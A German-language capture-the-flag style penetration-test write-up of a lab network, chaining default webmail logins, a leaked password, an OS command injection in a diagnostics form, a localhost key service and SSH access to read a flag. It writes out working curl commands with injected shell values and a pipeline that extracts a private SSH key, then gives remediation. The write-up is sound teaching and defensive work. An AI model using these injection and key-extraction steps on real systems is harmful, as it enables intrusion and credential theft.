Webmail Inbox und fehlender Benutzername
----------------------------------------

Die authentifizierte Session wurde verwendet:

.. code-block:: bash

   curl -s -b /tmp/mail.jar \
     -H 'Host: mail.vantis.internal' \
     http://10.47.84.110/inbox

**Relevante Nachricht:**

.. code-block:: text

   From: admin@vantis.internal
   To: malik.da-costa@vantis.internal
   Subject: Portal-Zugang
   Date: 13.08.2026 17:32

   Hoi Malik

   Habe dein Passwort fürs Portal auf dev abgelegt,
   kannst es dort nachschauen.
   Bitte gleich nach dem ersten Login ändern.

   Liebe Grüsse
   Admin

**Entscheidende Erkenntnis:**

Die Nachricht lieferte genau die Information, die seit dem frühen Fund
auf ``dev`` gefehlt hatte.

Benutzer:

``malik.da-costa``

Bereits bekanntes Passwort:

``GoldSchafHirsch593``

Damit konnten zwei zuvor getrennte Findings miteinander korreliert
werden.


Credential-Korrelation
----------------------

Aus der Webmail-Nachricht:

.. code-block:: text

   To: malik.da-costa@vantis.internal

und dem bereits zuvor gefundenen Inhalt auf ``dev.vantis.internal``:

.. code-block:: text

   portal login: GoldSchafHirsch593

ergaben sich vollständige Portal-Credentials:

.. code-block:: text

   Username: malik.da-costa
   Password: GoldSchafHirsch593

Dieser Schritt erklärte rückblickend auch, weshalb die vorherigen
Username-Guessing-Versuche nicht erfolgreich gewesen waren.

Der tatsächlich benötigte Benutzername ``malik.da-costa`` war nicht
Teil der zuvor getesteten Kandidaten und auch nicht in der verwendeten
Namensliste enthalten.


Erfolgreicher Login am Deploy Portal
------------------------------------

Die vollständigen Credentials wurden gegen den bereits identifizierten
Deploy-Login getestet.

**Befehl:**

.. code-block:: bash

   curl -i -c /tmp/deploy.jar \
     -H 'Host: deploy.vantis.internal' \
     --data-urlencode 'username=malik.da-costa' \
     --data-urlencode 'password=GoldSchafHirsch593' \
     http://10.47.84.110/login

**Ergebnis:**

Der Login war erfolgreich und eine authentifizierte Session wurde in:

``/tmp/deploy.jar``

gespeichert.

Im Portal wurde der aktuell angemeldete Benutzer als:

``malik.da-costa``

angezeigt.

Die zuvor geschützten Bereiche:

* ``/dashboard``
* ``/diagnostics``
* ``/uploads``

waren nun erreichbar.


Authentifizierte Analyse von /diagnostics
-----------------------------------------

Nach erfolgreichem Login wurde ``/diagnostics`` erneut untersucht.

**Befehl:**

.. code-block:: bash

   curl -s -b /tmp/deploy.jar \
     -H 'Host: deploy.vantis.internal' \
     http://10.47.84.110/diagnostics \
     | grep -Ein 'form|input|action|command|diagnostic|value='

**Relevante Ausgabe:**

.. code-block:: html

   <form method="post" action="/diagnostics" class="row g-3 align-items-end">
     <select name="action" class="form-select">

       <option value="uptime">Server Uptime</option>

       <option value="df -h">Disk Usage</option>

       <option value="free -m">Memory Usage</option>

       <option value="ls -la /opt/vantis-deploy/uploads | wc -l">
         File Count (Uploads)
       </option>

       <option value="ss -tulpn">
         Active Network Connections
       </option>

     </select>
   </form>

**Beobachtung:**

Der Client übermittelte im Parameter ``action`` direkt vollständige
Betriebssystembefehle.

Es entstand daher die Hypothese, dass die Anwendung den übermittelten
Wert serverseitig ohne ausreichende Allowlist-Prüfung an eine Shell
weitergibt.


Authenticated Command Injection
-------------------------------

Zum kontrollierten Nachweis wurde der nicht-destruktive Befehl:

``id``

als eigener ``action``-Wert übermittelt.

**Befehl:**

.. code-block:: bash

   curl -s -b /tmp/deploy.jar \
     -H 'Host: deploy.vantis.internal' \
     --data-urlencode 'action=id' \
     http://10.47.84.110/diagnostics


.. figure:: ../../_static/img/sem4/cys_03.PNG
   :alt: Erfolgreicher Nachweis der authentifizierten Command Injection mit Befehlsausführung als svc-vantis
   :align: center
   :width: 100%

**Relevante Ausgabe:**

.. code-block:: text

   uid=999(svc-vantis) gid=983(svc-vantis) groups=983(svc-vantis)

**Ergebnis:**

Der frei kontrollierbare Parameter ``action`` wurde serverseitig als
Shell-Befehl ausgeführt.

Damit war eine authentifizierte OS Command Injection bestätigt.

**Ausführungskontext:**

``svc-vantis``

**Finding:**

Authenticated OS Command Injection / Remote Command Execution.


==========================================
Kapitel 6 – Interner Pivot und SSH-Zugriff
==========================================

Neubewertung des Dienstes auf Port 8022
---------------------------------------

Bereits bei der Service Discovery war Port ``8022/tcp`` als
Gunicorn-Dienst identifiziert worden.

Alle direkten externen Zugriffsversuche hatten jedoch:

.. code-block:: text

   403 Forbidden

ergeben.

Auch Spoofing-Versuche mit:

* ``X-Forwarded-For: 127.0.0.1``
* ``X-Real-IP: 127.0.0.1``
* verschiedenen Host-Headern

hatten keinen Zugriff ermöglicht.

Die neu bestätigte Command Injection änderte diese Situation.

Da Befehle direkt auf ``web01`` als ``svc-vantis`` ausgeführt werden
konnten, war es nun möglich, einen echten HTTP-Request von der
Loopback-Schnittstelle des Zielhosts aus zu erzeugen.


Interner Zugriff auf Gunicorn / Port 8022
-----------------------------------------

Über die Command Injection wurde ein ``curl``-Request gegen den lokalen
Gunicorn-Dienst ausgeführt.

**Befehl:**

.. code-block:: bash

   curl -s -b /tmp/deploy.jar \
     -H 'Host: deploy.vantis.internal' \
     --data-urlencode \
       'action=curl -s http://127.0.0.1:8022/' \
     http://10.47.84.110/diagnostics

**Relevante Antwort:**

.. code-block:: text

   Personal Key Vault

   authorized_keys
   id_ed25519
   id_ed25519.pub

**Ergebnis:**

Der Dienst auf TCP/8022 war tatsächlich erreichbar, wenn der Request
von ``127.0.0.1`` des Zielsystems selbst stammte.

Die vorherigen 403-Antworten waren somit auf eine
Source-/Netzwerkbeschränkung zurückzuführen.

**Sicherheitsauswirkung:**

Durch die Command Injection konnte eine ansonsten vorhandene
Netzwerkzugriffsbeschränkung umgangen und ein interner Dienst erreicht
werden.


Zugriff auf den Personal Key Vault
----------------------------------

Die Root-Seite des Dienstes stellte drei SSH-bezogene Dateien bereit:

* ``authorized_keys``
* ``id_ed25519``
* ``id_ed25519.pub``

Besonders relevant war:

``/id_ed25519``

Da es sich hierbei um den privaten SSH-Schlüssel handelte.


Extraktion des SSH Private Keys
-------------------------------

Der private SSH-Schlüssel wurde über den internen Dienst abgerufen.

**Befehl:**

.. code-block:: bash

   curl -s -b /tmp/deploy.jar \
     -H 'Host: deploy.vantis.internal' \
     --data-urlencode \
       'action=curl -s http://127.0.0.1:8022/id_ed25519' \
     http://10.47.84.110/diagnostics

**Antwort:**

.. code-block:: text

   -----BEGIN OPENSSH PRIVATE KEY-----
   [...]
   -----END OPENSSH PRIVATE KEY-----

Der vollständige Schlüssel wird aus Sicherheits- und
Dokumentationsgründen nicht im Bericht wiedergegeben.

Der Schlüssel enthielt als Zuordnung den Benutzer:

``malik.da-costa``

Damit bestätigte sich die Zuordnung zwischen Portalaccount und
SSH-Schlüssel.


Extraktion aus der HTML-Antwort
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Da der Schlüssel innerhalb eines HTML-``pre``-Elements dargestellt
wurde, musste er für die lokale Verwendung sauber extrahiert werden.

**Befehl:**

.. code-block:: bash

   curl -s -b /tmp/deploy.jar \
     -H 'Host: deploy.vantis.internal' \
     --data-urlencode \
       'action=curl -s http://127.0.0.1:8022/id_ed25519' \
     http://10.47.84.110/diagnostics \
   | sed -n \
       '/-----BEGIN OPENSSH PRIVATE KEY-----/,/-----END OPENSSH PRIVATE KEY-----/p' \
   | sed \
       -e 's/^.*-----BEGIN OPENSSH PRIVATE KEY-----/-----BEGIN OPENSSH PRIVATE KEY-----/' \
       -e 's/-----END OPENSSH PRIVATE KEY-----.*$/-----END OPENSSH PRIVATE KEY-----/' \
   > /tmp/malik_key

Anschliessend wurden die Dateiberechtigungen gesetzt:

.. code-block:: bash

   chmod 600 /tmp/malik_key

Damit erfüllte der Schlüssel die von OpenSSH verlangten
Dateiberechtigungen.


SSH-Zugang auf web01
--------------------

Der extrahierte Private Key wurde anschliessend gegen den offenen
SSH-Dienst auf ``10.47.84.110`` verwendet.

**Befehl:**

.. code-block:: bash

   ssh \
     -i /tmp/malik_key \
     -o IdentitiesOnly=yes \
     malik.da-costa@10.47.84.110

**Ergebnis:**

Der SSH-Login war erfolgreich.


Validierung des Zugriffs
~~~~~~~~~~~~~~~~~~~~~~~~

Nach der Anmeldung wurden Benutzer, Host und Arbeitsverzeichnis
kontrolliert.

**Befehle:**

.. code-block:: bash

   id
   hostname
   pwd
   ls -la ~

**Ausgabe:**

.. code-block:: text

   uid=1000(malik.da-costa)
   gid=1000(malik.da-costa)
   groups=1000(malik.da-costa),27(sudo)

   web01.vantis.internal

   /home/malik.da-costa


.. figure:: ../../_static/img/sem4/cys_04.PNG
   :alt:  Validierung des SSH-Zugriffs auf web01.vantis.internal als Benutzer malik.da-costa
   :align: center
   :width: 100%

Das Home-Verzeichnis enthielt:

.. code-block:: text

   total 36
   drwxr-x--- 5 malik.da-costa malik.da-costa 4096 Sep  7 09:20 .
   drwxr-xr-x 3 root           root           4096 Sep  3 18:23 ..
   -rw-r--r-- 1 malik.da-costa malik.da-costa  220 Feb 13  2026 .bash_logout
   -rw-r--r-- 1 malik.da-costa malik.da-costa 3818 Sep  7 09:20 .bashrc
   drwx------ 2 malik.da-costa malik.da-costa 4096 Sep  7 09:20 .cache
   drwx------ 2 malik.da-costa malik.da-costa 4096 Sep  7 08:43 .gunicorn
   -rw-r--r-- 1 malik.da-costa malik.da-costa  807 Feb 13  2026 .profile
   drwx------ 2 malik.da-costa malik.da-costa 4096 Sep  3 18:23 .ssh
   -r-------- 1 malik.da-costa malik.da-costa  102 Sep  3 18:23 user.txt

**Ergebnis:**

Ein authentifizierter Shell-Zugang als Benutzer ``malik.da-costa`` auf
``web01.vantis.internal`` war erreicht.

Zusätzlich wurde festgestellt, dass der Benutzer Mitglied der Gruppe:

``sudo``

war.

Diese Beobachtung kann für eine separate Privilege-Escalation-Analyse
relevant sein, gehört jedoch nicht zum hier beschriebenen Pfad zu
Flag 1.


==========================
Kapitel 7 – Zielerreichung
==========================

Flag 1
------

Im Home-Verzeichnis befand sich:

``/home/malik.da-costa/user.txt``

Die Datei konnte mit den Rechten des kompromittierten Benutzers gelesen
werden.

**Befehl:**

.. code-block:: bash

   cat ~/user.txt

.. figure:: ../../_static/img/sem4/cys_05.PNG
   :alt: Auslesen von user.txt auf web01.vantis.internal und erfolgreicher Fund von Flag 1
   :align: center
   :width: 100%

**Ergebnis:**

.. code-block:: text

   CYSII{56d5e585c1abf4c677706f18d09f641b210c7942351c4625b9f5774d9c93e04a525335cff1d15fc6a78f3c9b6dd2a9}


.. note::

    **Zugriffslevel:**

    * Benutzer: ``malik.da-costa``
    * UID: ``1000``
    * Gruppen: ``malik.da-costa``, ``sudo``
    * Host: ``web01.vantis.internal``
    * Ziel-IP: ``10.47.84.110``


Reproduzierbarer finaler Analysepfad
------------------------------------

Der vollständige erfolgreiche Analysepfad lässt sich damit wie folgt
reproduzieren:

1. Host Discovery identifiziert ``10.47.84.110``.

2. Service Discovery identifiziert:

   * SSH auf Port 22
   * nginx auf Port 80
   * Gunicorn auf Port 8022

3. Virtual Host Enumeration identifiziert:

   * ``dev.vantis.internal``
   * ``deploy.vantis.internal``
   * ``mail.vantis.internal``

4. Auf ``dev.vantis.internal`` wird ein öffentlich erreichbares
   Directory Listing entdeckt.

5. Darin befindet sich:

   ``/staging/internal/mail/backups/deploy_notes.txt``

6. Die Datei enthält:

   ``GoldSchafHirsch593``

7. Mehrere Versuche, diesem Passwort direkt einen Deploy-Benutzer
   zuzuordnen, schlagen fehl.

8. Der Webmail-Dienst wird erneut untersucht.

9. ``vantis:vantis`` ermöglicht einen erfolgreichen Login auf
   ``mail.vantis.internal``.

10. Die Inbox enthält eine Nachricht an:

    ``malik.da-costa@vantis.internal``

    mit dem Hinweis, dass dessen Portal-Passwort auf ``dev`` abgelegt
    wurde.

11. Dadurch werden die beiden Informationen korreliert:

.. code-block:: text

   Username: malik.da-costa
   Password: GoldSchafHirsch593

12. Diese Credentials ermöglichen den Login auf:

    ``deploy.vantis.internal/login``

13. Nach der Authentifizierung wird ``/diagnostics`` untersucht.

14. Der Parameter ``action`` akzeptiert Shell-Kommandos.

15. Mit:

.. code-block:: text

   action=id

wird die Befehlsausführung bestätigt:

.. code-block:: text

   uid=999(svc-vantis)

16. Über diese Befehlsausführung wird der lokal beschränkte Dienst:

    ``http://127.0.0.1:8022/``

    angesprochen.

17. Dort wird der ``Personal Key Vault`` gefunden.

18. Der Vault stellt:

    ``id_ed25519``

    bereit.

19. Der private Schlüssel wird auf die Kali-VM extrahiert.

20. Mit dem Schlüssel erfolgt der erfolgreiche SSH-Login:

.. code-block:: text

   malik.da-costa@10.47.84.110

21. Im Home-Verzeichnis wird:

    ``user.txt``

    gelesen.

22. Damit wird Flag 1 erreicht.

.. figure:: ../../_static/img/sem4/cys_06.PNG
   :alt: Erfolgreiche Einreichung und Validierung von Flag 1 auf der CYS II Lab Plattform
   :align: center
   :width: 100%


===============================================
Kapitel 8 – Auswertung, Findings und Massnahmen
===============================================

Zusammenfassung der untersuchten Angriffspfade
----------------------------------------------

Der Pentest verlief nicht linear.

Insbesondere der frühe Fund von ``GoldSchafHirsch593`` führte zu
mehreren plausiblen, aber unterschiedlichen Angriffshypothesen.


Früher erfolgreicher Fund
~~~~~~~~~~~~~~~~~~~~~~~~~

**Erfolgreich:**

* Virtual Host Discovery
* Zugriff auf ``dev.vantis.internal``
* Directory Listing
* Fund von ``deploy_notes.txt``
* Fund von ``GoldSchafHirsch593``

**Zu diesem Zeitpunkt noch unbekannt:**

* Username
* exakter Verwendungszweck
* zugehöriger Dienst


Pfade auf dev
~~~~~~~~~~~~~

Geprüft:

* Backup-Dateivarianten
* weitere interne Verzeichnisse
* Benutzer-Home-Verzeichnisse
* ``.ssh``-Pfade
* Archive
* Releases
* Git-Dateien
* ``.env``
* Source-Code-Dateien
* Directory Traversal

**Ergebnis:**

Keine weiteren direkten Credentials oder Keys.


Pfade gegen Deploy Login
~~~~~~~~~~~~~~~~~~~~~~~~

Geprüft:

* manuelle Usernamen
* Serviceaccounts
* Administratoraccounts
* Maya-bezogene Usernamen
* 8'607 Namen aus einer Wordlist
* Setup-/Bootstrap-Accounts
* alternative Formularparameter
* SQL Injection
* alternative Authentifizierungsansätze

**Ergebnis:**

Kein erfolgreicher Login, solange der korrekte Benutzername nicht
bekannt war.


Session-basierte Pfade
~~~~~~~~~~~~~~~~~~~~~~

Geprüft:

* Flask Session Struktur
* ``GoldSchafHirsch593`` als mögliches Session Secret
* verschiedene Session-Claims
* unterschiedliche User IDs

**Ergebnis:**

Kein erfolgreicher Session-Bypass.


Routing- und Webserver-Pfade
~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Geprüft:

* URL-Normalisierung
* ``//``
* ``/./``
* Semicolon-Suffix
* URL Encoding
* nginx Alias Traversal
* ``/static../``
* Proxy-/Auth-Header

**Ergebnis:**

Kein Auth-Bypass.


Upload-Pfad
~~~~~~~~~~~

Geprüft:

* dynamische ``/uploads/<path>``-Route
* vermutete SSH-Dateien
* Traversal-Encoding
* HEAD-Requests
* Dateiexistenz-Orakel

**Ergebnis:**

Unauthentifiziert kein Zugriff.


Port 8022
~~~~~~~~~

Von Kali geprüft:

* direkter HTTP-Zugriff
* unterschiedliche Host-Header
* localhost
* 127.0.0.1
* X-Forwarded-For
* X-Real-IP

**Ergebnis:**

Immer 403.

Nach Erreichen der Command Injection:

* echter Request vom Zielhost an ``127.0.0.1:8022``

**Ergebnis:**

Erfolgreicher Zugriff auf den Personal Key Vault.


Mail-Pfade
~~~~~~~~~~

Zunächst geprüft:

* ``GoldSchafHirsch593`` mit vermuteten Benutzern
* SQL Injection
* Endpoint Enumeration

**Ergebnis:**

Kein Zugang.

Später geprüft:

.. code-block:: text

   vantis : vantis

**Ergebnis:**

Erfolgreicher Webmail-Login und Offenlegung des fehlenden
Portal-Benutzernamens.


Warum die erfolglosen Tests relevant waren
------------------------------------------

Die nicht erfolgreichen Tests waren trotzdem ein wichtiger Bestandteil
des Analyseprozesses.

Sie halfen dabei:

* falsche Annahmen über ``GoldSchafHirsch593`` auszuschliessen,
* den Nutzen von Port 8022 korrekt einzuordnen,
* zu erkennen, dass beim Deploy Login Kontext fehlte,
* direkte Web-Bypasses als unwahrscheinlich einzustufen,
* die Suche nach weiteren Dateien auf ``dev`` einzugrenzen,
* und den Webmail-Dienst erneut zu priorisieren.

Insbesondere zeigte sich, dass ein gefundener Credential-Wert alleine
noch nicht zwingend unmittelbar nutzbar ist.

Der entscheidende Schritt war die Korrelation mehrerer unabhängiger
Informationsquellen.


Relevante Findings
------------------

Default Credentials auf VantisMail
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

**Host:**

``mail.vantis.internal``

**Credentials:**

``vantis:vantis``

**Auswirkung:**

Unautorisierter Zugriff auf interne Mailinhalte.

Die Inbox enthielt sicherheitsrelevante Informationen über einen
Deploy-Portal-Benutzer.


Sensitive Information Disclosure
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

**Host:**

``dev.vantis.internal``

**Pfad:**

``/staging/internal/mail/backups/deploy_notes.txt``

**Inhalt:**

.. code-block:: text

   portal login: GoldSchafHirsch593
   TODO: change after initial login!

**Auswirkung:**

Offenlegung eines gültigen internen Portal-Passworts.


Directory Listing
~~~~~~~~~~~~~~~~~

**Pfad:**

``/staging/internal/mail/backups/``

**Auswirkung:**

Interne Backup-Dateien konnten ohne Authentifizierung aufgelistet und
abgerufen werden.


Credential Correlation
~~~~~~~~~~~~~~~~~~~~~~

Die einzelnen Informationen waren jeweils unvollständig.

**Mail:**

``malik.da-costa``

**dev:**

``GoldSchafHirsch593``

In Kombination:

.. code-block:: text

   malik.da-costa : GoldSchafHirsch593

Damit war eine erfolgreiche Authentifizierung am Deploy Portal möglich.


Authenticated Command Injection
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

**Host:**

``deploy.vantis.internal``

**Endpoint:**

``/diagnostics``

**Parameter:**

``action``

**Nachweis:**

.. code-block:: text

   action=id

   uid=999(svc-vantis)
   gid=983(svc-vantis)

**Auswirkung:**

Beliebige Betriebssystembefehle im Kontext von ``svc-vantis``.


Localhost-only Key Vault
~~~~~~~~~~~~~~~~~~~~~~~~

**Dienst:**

``127.0.0.1:8022``

Extern:

``403 Forbidden``

Lokal über Command Injection:

erfolgreich.

**Angebotene Dateien:**

* ``authorized_keys``
* ``id_ed25519``
* ``id_ed25519.pub``


SSH Private Key Disclosure
~~~~~~~~~~~~~~~~~~~~~~~~~~

Der private SSH-Schlüssel von ``malik.da-costa`` konnte über den lokalen
Key Vault gelesen werden.

Dieser erlaubte eine direkte SSH-Anmeldung auf ``web01``.


Benutzerzugang auf web01
~~~~~~~~~~~~~~~~~~~~~~~~

.. code-block:: text

   uid=1000(malik.da-costa)
   gid=1000(malik.da-costa)
   groups=1000(malik.da-costa),27(sudo)

Damit wurde ein authentifizierter Shell-Zugang auf dem Zielhost
erreicht.


Risikokette
-----------

Die Kompromittierung entstand nicht durch eine einzelne Schwachstelle,
sondern durch die Kombination mehrerer Sicherheitsprobleme.

.. code-block:: text

   Public Directory Listing
          |
          v
   Klartext-Portal-Passwort
   GoldSchafHirsch593
          |
          v
   fehlender Benutzername
          |
          +--> mehrere erfolglose Analysepfade
          |
          v
   Default Credentials auf Webmail
   vantis:vantis
          |
          v
   Inbox Disclosure
          |
          v
   malik.da-costa
          |
          v
   Credential Correlation
          |
          v
   Deploy Portal Access
          |
          v
   Command Injection
          |
          v
   Zugriff auf localhost-only Dienst
          |
          v
   SSH Private Key Disclosure
          |
          v
   SSH Compromise von web01
          |
          v
   Flag 1


Dokumentierte Änderungen
------------------------

Auf der Kali-VM wurden unter anderem folgende lokale Dateien erzeugt:

* ``/tmp/mail.jar``
* ``/tmp/deploy.jar``
* ``/tmp/malik_key``
* temporäre HTTP-Responses
* Nmap-Ausgaben
* Masscan-Ausgaben
* ffuf-Ausgaben

Die lokale ``/etc/hosts``-Datei wurde zur Namensauflösung angepasst.

Diese Änderungen betrafen nicht die Zielsysteme.

Der private SSH-Schlüssel wurde lokal mit:

.. code-block:: bash

   chmod 600 /tmp/malik_key

geschützt.


RoE-Konformität
---------------

Die aktive Exploitation konzentrierte sich auf:

``10.47.84.110``

Der Host:

``10.47.84.1``

wurde nach seiner Einordnung als Infrastrukturkomponente nicht weiter
angegriffen.

Es wurden keine:

* DoS-Aktivitäten
* Resource-Exhaustion-Angriffe
* absichtlichen Löschungen
* destruktiven Änderungen
* Aktivitäten ausserhalb des Scopes

durchgeführt.


Empfohlene Massnahmen
---------------------

Webmail
~~~~~~~

* Default Credentials entfernen.
* individuelle starke Passwörter erzwingen.
* MFA für interne Dienste prüfen.
* Legacy-Webanwendungen aktualisieren oder ersetzen.
* Login-Monitoring und Rate Limiting einsetzen.


Backup-Verzeichnisse
~~~~~~~~~~~~~~~~~~~~

* nginx Directory Listing deaktivieren.
* Backup-Dateien ausserhalb des Webroots speichern.
* Staging-Verzeichnisse nicht öffentlich bereitstellen.
* Deployment-Notizen nicht über HTTP verfügbar machen.


Credential Handling
~~~~~~~~~~~~~~~~~~~

* Keine Klartext-Passwörter in Textdateien speichern.
* Secrets über einen Secret Manager verwalten.
* Initial-Credentials nach einmaliger Nutzung automatisch invalidieren.
* exponierte Credentials sofort rotieren.


Deploy Portal
~~~~~~~~~~~~~

* Benutzerkontrollierte Eingaben niemals direkt an eine Shell übergeben.
* feste serverseitige Diagnoseaktionen implementieren.
* sichere Prozess-APIs ohne Shell-Interpretation verwenden.
* Eingaben mit einer Allowlist validieren.
* Dienst nach Least-Privilege-Prinzip betreiben.


Port 8022 / Key Vault
~~~~~~~~~~~~~~~~~~~~~

* Private SSH-Schlüssel nicht über HTTP bereitstellen.
* Auch localhost-only Services als relevante Angriffsfläche behandeln.
* Zugriff authentifizieren und autorisieren.
* Private Keys in einem dedizierten Key-Management-System speichern.
* Zugriffe protokollieren.


SSH
~~~

* kompromittierten Private Key ersetzen.
* ``authorized_keys`` überprüfen.
* Keys regelmässig rotieren.
* Benutzerrechte minimieren.
* Sudo-Berechtigungen nach Least Privilege überprüfen.


Schlussfolgerung
----------------

Die Analyse war ein mehrstufiger Prozess mit mehreren plausiblen
Angriffshypothesen.

Ein wichtiger Wendepunkt war der relativ frühe Fund von:

``GoldSchafHirsch593``

auf ``dev.vantis.internal``.

Dieser Fund führte jedoch nicht direkt zur Kompromittierung, da der
passende Benutzername zunächst fehlte.

In der Folge wurden mehrere Möglichkeiten untersucht:

* Username Guessing
* Credential Reuse
* SQL Injection
* Flask Session Forging
* Directory Traversal
* Upload Traversal
* Authentifizierungs-Bypasses
* Proxy Header Manipulation
* URL-Normalisierung
* nginx Alias Traversal
* direkte Key- und Credential-Routen
* direkter Zugriff auf Port 8022
* Mail-Login mit vermuteten Benutzern

Diese Tests führten nicht unmittelbar zum Ziel, waren jedoch wichtig, um
die Angriffsfläche einzugrenzen und falsche Hypothesen auszuschliessen.

Der entscheidende Fortschritt entstand schliesslich durch die
Korrelation bereits vorhandener Informationen:

1. ``dev.vantis.internal`` offenbarte früh das Passwort
   ``GoldSchafHirsch593``.

2. Der Default-Login ``vantis:vantis`` ermöglichte den Zugriff auf
   ``mail.vantis.internal``.

3. Die Inbox offenbarte den zugehörigen Portal-Benutzer
   ``malik.da-costa``.

4. Benutzername und bereits zuvor gefundenes Passwort ergaben gültige
   Deploy-Portal-Credentials.

5. Nach der Authentifizierung wurde in ``/diagnostics`` eine
   Command Injection über den Parameter ``action`` bestätigt.

6. Die Befehlsausführung als ``svc-vantis`` ermöglichte einen echten
   lokalen Request an ``127.0.0.1:8022``.

7. Der lokale Dienst stellte einen Personal Key Vault mit dem privaten
   SSH-Schlüssel von ``malik.da-costa`` bereit.

8. Der Schlüssel ermöglichte den erfolgreichen SSH-Zugang auf
   ``web01.vantis.internal``.

9. Im Home-Verzeichnis konnte ``user.txt`` gelesen und Flag 1
   erfolgreich erlangt werden.

Der Pentest zeigt damit besonders deutlich, dass einzelne Findings erst
durch ihre Korrelation zu einer vollständigen Angriffskette werden
können.

Der frühe Fund von ``GoldSchafHirsch593`` war dabei der zentrale Pivot,
der zahlreiche Analysepfade auslöste, jedoch erst zusammen mit dem
später identifizierten Benutzer ``malik.da-costa`` erfolgreich genutzt
werden konnte.

Gleichzeitig zeigte die Analyse den Wert negativer Testergebnisse:
Die fehlgeschlagenen Versuche gegen Login, Session, Traversal, Routing
und Port 8022 halfen, einzelne Hypothesen gezielt auszuschliessen und
den Fokus schrittweise auf die tatsächlich relevante Kombination aus
Webmail, Credential Disclosure und authentifizierter Command Injection
zu verlagern.

Die vollständige Angriffskette war damit reproduzierbar und führte von
einem schwach geschützten internen Webmail-Zugang über mehrere
Informationslecks und eine Command Injection bis zu einem
authentifizierten SSH-Zugang auf dem Zielhost.
